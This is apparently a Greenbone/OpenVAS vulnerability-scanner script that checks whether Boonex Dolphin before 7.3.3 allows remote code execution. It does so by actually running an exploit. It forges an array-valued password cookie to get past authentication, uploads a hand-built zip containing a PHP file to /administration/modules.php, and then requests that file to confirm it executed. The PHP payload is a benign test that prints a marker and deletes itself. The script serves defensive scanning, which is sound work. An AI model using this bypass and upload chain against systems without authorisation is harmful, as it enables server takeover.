CPE = "cpe:/a:boonex:dolphin";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140061" );
	script_version( "2021-05-17T11:26:07+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Boonex Dolphin < 7.3.3 RCE Vulnerability" );
	script_tag( name: "last_modification", value: "2021-05-17 11:26:07 +0000 (Mon, 17 May 2021)" );
	script_tag( name: "creation_date", value: "2016-11-15 12:20:21 +0100 (Tue, 15 Nov 2016)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "gb_dolphin_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Dolphin/Installed" );
	script_xref( name: "URL", value: "https://www.boonex.com/n/dolphinpro-7-3-3-released-important-security-upda" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40756/" );
	script_tag( name: "vuldetect", value: "Upload a php file within a zip file and try to execute it." );
	script_tag( name: "summary", value: "Boonex Dolphin is prone to a remote code execution (RCE)
  vulnerability in `/administration/modules.php`." );
	script_tag( name: "solution", value: "Update to 7.3.3 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
rand = rand_str( length: 8, charset: "abcdefghijklmnopqrstuvwxyz1234567890" );
vtstrings = get_vt_strings();
file = vtstrings["lowercase"] + "_" + rand + ".php";
zipfile = vtstrings["lowercase"] + "_" + rand + ".zip";
test_pattern = vtstrings["default"] + " RCE Test";
b64_pattern = base64( str: test_pattern );
zip = raw_string( 0x50, 0x4b, 0x03, 0x04, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x99, 0x5a, 0x6f, 0x49, 0x4a, 0x3e, 0x5f, 0x42, 0x4b, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x14, 0x00, 0x1c, 0x00 ) + file + raw_string( 0x55, 0x54, 0x09, 0x00, 0x03, 0x81, 0xe1, 0x2a, 0x58, 0x7e, 0xe0, 0x2a, 0x58, 0x75, 0x78, 0x0b, 0x00, 0x01, 0x04, 0xe8, 0x03, 0x00, 0x00, 0x04, 0x64, 0x00, 0x00, 0x00, 0x3c, 0x3f, 0x70, 0x68, 0x70, 0x20, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x62, 0x61, 0x73, 0x65, 0x36, 0x34, 0x5f, 0x64, 0x65, 0x63, 0x6f, 0x64, 0x65, 0x28, 0x22 ) + b64_pattern + raw_string( 0x22, 0x29, 0x3b, 0x20, 0x75, 0x6e, 0x6c, 0x69, 0x6e, 0x6b, 0x28, 0x5f, 0x5f, 0x46, 0x49, 0x4c, 0x45, 0x5f, 0x5f, 0x29, 0x3b, 0x20, 0x3f, 0x3e, 0x0a, 0x50, 0x4b, 0x01, 0x02, 0x1e, 0x03, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x99, 0x5a, 0x6f, 0x49, 0x4a, 0x3e, 0x5f, 0x42, 0x4b, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x14, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xa4, 0x81, 0x00, 0x00, 0x00, 0x00 ) + file + raw_string( 0x55, 0x54, 0x05, 0x00, 0x03, 0x81, 0xe1, 0x2a, 0x58, 0x75, 0x78, 0x0b, 0x00, 0x01, 0x04, 0xe8, 0x03, 0x00, 0x00, 0x04, 0x64, 0x00, 0x00, 0x00, 0x50, 0x4b, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x5a, 0x00, 0x00, 0x00, 0x99, 0x00, 0x00, 0x00, 0x00, 0x00 );
post_data = "-----------------------------\r\n" + "Content-Disposition: form-data; name=\"submit_upload\"\r\n" + "\r\n" + vtstrings["lowercase"] + "\r\n" + "-----------------------------\r\n" + "Content-Disposition: form-data; name=\"csrf_token\"\r\n" + "\r\n" + vtstrings["lowercase"] + "\r\n" + "-----------------------------\r\n" + "Content-Disposition: form-data; name=\"module\"; filename=\"" + zipfile + "\"\r\n" + "Content-Type: application/zip\r\n" + "\r\n" + zip + "\r\n" + "-------------------------------";
req = http_post_put_req( port: port, url: dir + "/administration/modules.php", data: post_data, add_headers: make_array( "Cookie", NASLString( "memberID=1; memberPassword[]=", vtstrings["lowercase"], ";" ), "Content-Type", "multipart/form-data; boundary=---------------------------" ) );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(buf = http_vuln_check( port: port, url: dir + "/tmp/" + file, pattern: test_pattern )){
	report = "It was possible to upload `" + dir + "/tmp/" + file + "` and to execute it.\n\nContent of `" + file + "`:\n\n\"<?php echo base64_decode(" + b64_pattern + "\"); unlink(__FILE__); ?>\"\n\nResponse:\n\n" + buf;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

